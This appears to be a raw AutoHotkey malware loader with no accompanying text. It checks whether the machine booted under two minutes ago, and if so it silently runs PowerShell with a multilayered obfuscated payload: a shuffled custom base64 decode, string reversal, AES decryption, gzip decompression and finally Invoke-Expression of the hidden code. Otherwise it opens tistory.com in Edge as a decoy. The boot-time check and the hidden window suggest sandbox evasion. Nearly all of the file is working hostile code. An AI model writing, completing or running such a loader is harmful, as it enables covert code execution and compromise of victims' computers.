
b1 := GetSystemBootTime()
b2 := A_Now
b3 := DateDiff(b1, b2)

if( b3 < 120 )
{
   ShellRun("powershell.exe", "$data = 'ZHdsbmNENVNlMGxtYzFOV1pUNVNibFIzYzVOMVciDQokcG1neHZraXpzeHh5dW8gPSAkb3Bvemp0eHFuaW56emluLlRvQ2hhckFycmF5KCkNClthcnJheV06OlJldmVyc2UoJHBtZ3h2a2l6c3h4eXVvKQ0KJHd1bnJqd29vd2pnenF6bmpqID0gLWpvaW4oJHBtZ3h2a2l6c3h4eXVvKQ0KJHVucHp1aG1vdm9xb2preWd2ID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygkd3Vucmp3b293amd6cXpuamopKQ0KJHZ3dWdrcHJveXBucXVtID0gJiAoW3NjcmlwdGJsb2NrXTo6Q3JlYXRlKCR1bnB6dWhtb3ZvcW9qa3lndikpDQokaGtubXRvcXV0bWdnLlBhZGRpbmcgPSAkdnd1Z2twcm95cG5xdW0NCiRoa25tdG9xdXRtZ2cuQmxvY2tTaXplID0gMTI4DQokaGtubXRvcXV0bWdnLktleVNpemUgPSAyNTYKJGhrbm10b3F1dG1nZy5LZXkgPSAkdnBrdXV0bnVtaQ0KJGhrbm10b3F1dG1nZy5JViA9ICRtenFpZ3h3aWlqbWtuWzAuLjE1XQ0KJHB4Z3V4anRwbW53ID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygiVTNsemRHVnRMa2xQTGsxbGJXOXllVk4wY21WaGJRPT0iKSkNCiRycGp1eGl4bnlpbyA9IE5ldy1PYmplY3QgJHB4Z3V4anRwbW53KCwkaGtubXRvcXV0bWdnLkNyZWF0ZURlY3J5cHRvcigpLlRyYW5zZm9ybUZpbmFsQmxvY2soJG16cWlneHdpaWpta24sMTYsJG16cWlneHdpaWpta24uTGVuZ3RoLTE2KSkNCiR3empvbWtoeHN0ID0gTmV3LU9iamVjdCAkcHhndXhqdHBtbncNCiR6dHpzeWpuaXN4aHAgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCJVM2x6ZEdWdExrbFBMa052YlhCeVpYTnphVzl1TGtkNmFYQlRkSEpsWVcwPSIpKQ0KJG11aHR2a3l6cHNtemtodnYgPSBOZXctT2JqZWN0ICR6dHpzeWpuaXN4aHAgJHJwanV4aXhueWlvLCAoW0lPLkNvbXByZXNzaW9uLkNvbXByZXNzaW9uTW9kZV06OkRlY29tcHJlc3MpDQokbXVodHZreXpwc216a2h2di5Db3B5VG8oJHd6am9ta2h4c3QpDQokbXVodHZreXpwc216a2h2di5DbG9zZSgpDQokaGtubXRvcXV0bWdnLkRpc3Bvc2UoKQ0KJHJwanV4aXhueWlvLkNsb3NlKCkNCiR2dnBweG55cW16eHBobnQgPSAmIChbc2NyaXB0YmxvY2tdOjpDcmVhdGUoW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygiVzFONWMzUmxiUzVVWlhoMExrVnVZMjlrYVc1blhRPT0iKSkpKQ0KJHFteXB6cGt3bnV4aG9pciA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoIlZWUkdPQT09IikpDQokcHhndXhqdHBtbncgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCJWRzlCY25KaGVRPT0iKSkNCiR6dHpzeWpuaXN4aHAgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCJSMlYwVTNSeWFXNW4iKSkNCiRzaXRqbW1veXF2eW5wcmtxeSA9ICR2dnBweG55cW16eHBobnQ6OiRxbXlwenBrd251eGhvaXIuJHp0enN5am5pc3hocCgkd3pqb21raHhzdC4kcHhndXhqdHBtbncoKSkNCkludm9rZS1FeHByZXNzaW9uKCRzaXRqbW1veXF2eW5wcmtxeSkNCg==JHJ5a3FwZ2lxam0gPSAiPT13Uis5QXFMeVV0WWRLbGI5elViMzdzRWJCNEI5YWhsczhmVjBOZCtHNVdrR2FkS2lrZDJSUGNSQjd3VVZkRk5zSDU1UVRHM1NTa2JxNmxEcFkyZ3V5YU9UaGNZamNuZnFIWkIwU3lpMldVQzZadmRIZWoySnVLa0l3dTJsQUdTTGs4dnFBRlcxdjBBY3M0eTFKdnptZGZhdGExRXI2RTZYd1JST3VlemdoZHMvRm5jQSthQVRxWXpocEl3cWpLWFJySGpyZ3pmOUl4MVczSGhKSXphYzRrYmJwdFZKY3BXc2VWLzBmVEtFV3h4UUFKTm5xcGFhb0NURWdiTGNSUWZWTE1tb1Fjb0dLdlVtQ2lhS2xLVDUrZ1Z5QU9CNk1LRVVlb0xqaGNzYnVCa2JjajBrUnBOckU5ZDlGbEFjSVR2dm5GaEgxaURjQ0RyRkFIT3NYREZ4Z0pXM3dHbFdMRTZRSHk1SUdMRTdoSUpWWnRsN1l5dDYwZnQ0RGhGY2pKa04vL1RkeG9UZVBiN0VpZ3ZNbktHbUlObWZTbVh1YTBEcFVjUUh2YnNpL28zc0hUY3JaMmdNV253cjRISDZkWUJOS295R3RoNjNVS216c0R2dWlQNVJJcFQzajJQVkhjTC8zNVZXaFJTTkVLRFRNbGdQSzJlMVNoYThtNHFSRFdyUkR3QW9JNlFrd2lXVG1QTDl3b2lNS3hFbXhPci9MYUJwbCtkdkc5Uk8zWUI2cUlzdE53TGlnZk4vZUFCS0tMSmk2TEo0Ym5kS2VNdC9GZ3Q4cHp2ZFFyTVFmL09OSWgrMXZNK2VnMjNqdmFmbVBwdnU2ODdUWnA0N051Y2l4RTVUY3Z4TWtsYk9lb3ZMbG1Pc3BaVGJiOG51a0JINFJiNE5mbzJIVEZUWlV5SGNERVJpQncwaDZjWm1ieEd1K3dFWUN1RTVrT2dDNDVaYkIzcEtiMVJGbFhWZ05hMTYvUU1YTXJFODBYc2pyRVEycjZnVWd0R0tzbkY0Z3dWRFdkbS9jRUJzRnhwOFhFZVpuR3FXYy9zeEtlIg0KJGpwaHh4eGlwcXRzayA9ICRyeWtxcGdpcWptLlRvQ2hhckFycmF5KCkNClthcnJheV06OlJldmVyc2UoJGpwaHh4eGlwcXRzaykNCiR4cGdwc3lrc25vcGp1aCA9IC1qb2luKCRqcGh4eHhpcHF0c2spDQokbXpxaWd4d2lpam1rbiA9IFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoIiR4cGdwc3lrc25vcGp1aCIpDQokdnBrdXV0bnVtaSA9IFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoIm82MDB5ODNRTHIyUDFTb1dBY1ZhNHZVclY4VXcwcFhQbjVwQnNka0JOK2c9IikNCiR6anpna3BvcW51c3R4cWggPSAiVTNsemRHVnRMbE5sWTNWeWFYUjVMa055ZVhCMGIyZHlZWEJvZVM1QlpYTk5ZVzVoWjJWa0NnPT0iDQokcXVubnhwdXN0b3d3a2dnID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygkemp6Z2twb3FudXN0eHFoKSkNCiRoa25tdG9xdXRtZ2cgPSBOZXctT2JqZWN0ICIkcXVubnhwdXN0b3d3a2dnIg0KJGlwb3F5cWppcW5xa2l5bmogPSAiPT1nUURWa082MFZaazlXVHlWR2F3bDJRdWtIYXdGbWNuOUdkd2xuY0Q1U2UwbG1jMU5XWlQ1U2JsUjNjNU4xVyINCiRqeHd3aHl1d3hyeG56cCA9ICRpcG9xeXFqaXFucWtpeW5qLlRvQ2hhckFycmF5KCkNClthcnJheV06OlJldmVyc2UoJGp4d3doeXV3eHJ4bnpwKQ0KJHdyemt3cm15b3pvZyA9IC1qb2luKCRqeHd3aHl1d3hyeG56cCkNCiRqdnd0c2pycXZpID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygkd3J6a3dybXlvem9nKSkNCiR1em9yZ3preG1taSA9ICYgKFtzY3JpcHRibG9ja106OkNyZWF0ZSgkanZ3dHNqcnF2aSkpDQokaGtubXRvcXV0bWdnLk1vZGUgPSAkdXpvcmd6a3htbWkNCiRvcG96anR4cW5pbnp6aW4gPSAiPT13Y3ZKWFphcGpPZFZHWnYxMFp1bEdaa0ZHVXVrSGF3Rm1jbjlH'; $base64Chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';$midpoint = [math]::Ceiling($data.Length / 2);$firstHalf = $data.Substring(0, $midpoint); $secondHalf = $data.Substring($midpoint); $base64Encoded = $secondHalf + $firstHalf; $binaryString = '';foreach ($char in $base64Encoded.ToCharArray()) { if ($char -ne '=') { $index = $base64Chars.IndexOf($char); $binaryString += [Convert]::ToString($index, 2).PadLeft(6, '0')}};$byteArray = @(); try{for ($i = 0; $i -lt $binaryString.Length; $i += 8) { $byte = [Convert]::ToInt32($binaryString.Substring($i, 8), 2); $byteArray += $byte }} catch{};$decodedString = [System.Text.Encoding]::UTF8.GetString($byteArray); IEX($decodedString)" . "", "", "", 0)
}else
{
    ShellRun("msedge.exe", "https://tistory.com", "", "", 0)
}

DateDiff(start, end) {
   
    startYear := SubStr(start, 1, 4)
    startMonth := SubStr(start, 6, 2)
    startDay := SubStr(start, 9, 2)
    startHour := SubStr(start, 12, 2)
    startMinute := SubStr(start, 15, 2)
    startSecond := SubStr(start, 18, 2)

    ; End Date
    endYear := SubStr(end, 1, 4)
    endMonth := SubStr(end, 5, 2)
    endDay := SubStr(end, 7, 2)
    endHour := SubStr(end, 9, 2)
    endMinute := SubStr(end, 11, 2)
    endSecond := SubStr(end, 13, 2)

    startTimeInSeconds := DateToSeconds(startYear, startMonth, startDay, startHour, startMinute, startSecond)
    endTimeInSeconds := DateToSeconds(endYear, endMonth, endDay, endHour, endMinute, endSecond)

    return endTimeInSeconds - startTimeInSeconds
}

DateToSeconds(year, month, day, hour, minute, second) {
    date := (Integer(year) - 1970) * 31536000  
    date += (Integer(month) - 1) * 2628000     
    date += (Integer(day) - 1) * 86400         
    date += Integer(hour) * 3600               
    date += Integer(minute) * 60               
    date += Integer(second)        
    return date
}
GetSystemBootTime() {
    for process in ComObjGet("winmgmts:\\.\root\cimv2").ExecQuery("SELECT LastBootUpTime FROM Win32_OperatingSystem")
        return SubStr(process.LastBootUpTime, 1, 4) . "-" . SubStr(process.LastBootUpTime, 5, 2) . "-" . SubStr(process.LastBootUpTime, 7, 2) . " " . SubStr(process.LastBootUpTime, 9, 2) . ":" . SubStr(process.LastBootUpTime, 11, 2) . ":" . SubStr(process.LastBootUpTime, 13, 2)
}

ShellRun(filePath, arguments := "", directory := "", operation := "", show := 0) {
    static VT_UI4 := 0x13, SWC_DESKTOP := ComValue(VT_UI4, 0x8)
    ComObject("Shell.Application").Windows.Item(SWC_DESKTOP).Document.Application
        .ShellExecute(filePath, arguments, directory, operation, show)
}
